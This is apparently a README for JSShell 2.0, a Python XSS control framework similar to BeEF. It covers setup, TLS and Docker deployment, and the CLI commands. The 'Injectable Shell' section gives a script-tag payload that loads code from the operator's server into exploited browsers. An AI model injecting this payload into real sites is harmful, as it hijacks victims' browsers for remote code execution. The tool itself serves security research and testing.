# JSShell 2.0

[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)
[![Generic badge](https://img.shields.io/badge/docker-friendly-blue.svg)](https://shields.io/)
[![Generic badge](https://img.shields.io/badge/python-3.6+-green.svg)](https://shields.io/)

An interactive multi-user web based javascript shell. It was initially created in order to debug remote 
esoteric browsers during experiments and research. This tool can be easily attached to XSS (Cross Site Scripting)
payload to achieve browser remote code execution (similar to the BeeF framework).

Version 2.0 is created entirely from scratch, introducing new exciting features, stability and maintainability.

###### Version: 2.0

## Author
[Daniel Abeles](https://twitter.com/Daniel_Abeles).

### Shell Video
[![asciicast](https://asciinema.org/a/217167.png)](https://asciinema.org/a/217167)

## Features
* Multi client support
* Cyclic DOM objects support
* Pre flight scripts
* Command Queue & Context
* Extensible with Plugins
* Injectable via `<script>` tags
* Dumping command output to file
* Shell pagination
* HTTPS support! [![Generic badge](https://img.shields.io/badge/new-green.svg)](https://shields.io/)


## Installation & Setup

### Config File
In the `resources` directory, update the `config.json` file with your desired configuration:
* Database host - if running with the `docker` deployment method, choose the database host as `db` 
(which is the internal host name).
* Return URL - the URL which the requests will follow. The `shell.js` file does some AJAX calls to register and poll
for new commands. Usually it will be `http[s]://{YOUR_SERVER_IP}:{PORT}`.
* Startup script - a script that runs automatically when the JSShell CLI client is spawned.
* Domain - if you desire to generate TLS certificates, this is the domain name the server will use.
* It is also possible to point at a remote database if desired.


### Let's Encrypt
Now JSShell supports TLS, which means you can now generate TLS certificates and feed them to the web server.
The web server will infer the domain name from the `config.json` file. In order to create the certificate,
use the `create_cert.py` script in the `scripts` folder:

```bash
$ cd scripts
$ python create_cert.py --domain <YOUR_DOMAIN> --email <YOUR_EMAIL>
```

##### the email field is optional.

Please note that the web server must be down in order for the script to function properly. At this point, we have
successfully generated our certificates! The sole modifications we need to do are:
* In the `config.json` file, change the schema of the `URL` field to `https`.
* In the `docker-compose.yml` file change the exposed port of the `web` container to `443`.


### Docker
This new version supports installing and running JSShell via `docker` and `docker-compose`. Now, to install and run the
entire JSShell framework, simply run:

```bash
$ ./scripts/start_docker_shell.sh
```

This will:
- Start and create the database in the background
- Start the web API server that handles incoming connections in the background
- Spawn a new instance of the `JSShell` command line interface container

### Regular
If you still want to use the old fashion method of installing, simply make sure you have a `MongoDB`
database up and running, and update the `config.json` file residing in the `resources` directory.

I recommend using a virtual environment with `pyenv`:
```bash
$ pyenv virtualenv -p python3.6 venv
$ pyenv activate venv
```

Or using `virtualenv`:

```bash 
$ virtualenv -p python3.6 venv
$ source venv/bin/activate
```

Then, install the requirements:
```bash
$ pip install -r requirements.txt
```

## Running
If you used the `docker` method, there's no need to run the following procedure.

### Web Server
Otherwise, once we have the database setup, we need to start the web API server. To do, run:
```bash
$ python manage.py web
```

This will create and run a web server that listens to incoming connections and serves our JSShell code. 

### Shell
Now to start the JSShell CLI, run the same script but now with the `shell` flag:
```bash
$ python manage.py shell
```

## Usage
After setup and running the required components, enter the `help` command to see the available commands:
```
     ╦╔═╗┌─┐┬ ┬┌─┐┬  ┬  
     ║╚═╗└─┐├─┤├┤ │  │  
    ╚╝╚═╝└─┘┴ ┴└─┘┴─┘┴─┘ 2.0     
        by @Daniel_Abeles
    
>> help

Documented commands (type help <topic>):

General Commands
--------------------------------------------------------------------------------
edit                Edit a file in a text editor
help                List available commands or provide detailed help for a specific command
history             View, run, edit, save, or clear previously entered commands
ipy                 Enter an interactive IPython shell
py                  Invoke Python command or shell
quit                Exit this application

Shell Based Operations
--------------------------------------------------------------------------------
back                Un-select the current selected client
clients             List and control the clients that have registered to our system
commands            Show the executed commands on the selected client
dump                Dumps a command to the disk
execute             Execute commands on the selected client
select              Select a client as the current client

>> 
```

## Flow
JSShell supports 2 methods of operation:
1. Injectable Shell (similar to BeeF framework)
2. Hosted Shell (for debugging)

### Injectable Shell
Similar to other XSS control frameworks (like BeeF), JSShell is capable of managing successful XSS exploitations.
In example, if you can inject a `script` tag, inject the following resource to your payload, and a new client will 
appear in your console: 

`<script src="http[s]://{YOUR_SERVER_IP}:{PORT}/content/js"></script>`

### Hosted Shell 
If you desire to debug exotic and esoteric browsers, you can simply navigate to `http[s]://{YOUR_SERVER_IP}:{PORT}/` and
a new client will pop up into your JSShell CLI client. Now it is debuggable via our JSShell console.

## Credits
[Canop](https://github.com/Canop) for [JSON.prune](https://github.com/Canop/JSON.prune/)


###### use it at your own responsibility and risk.
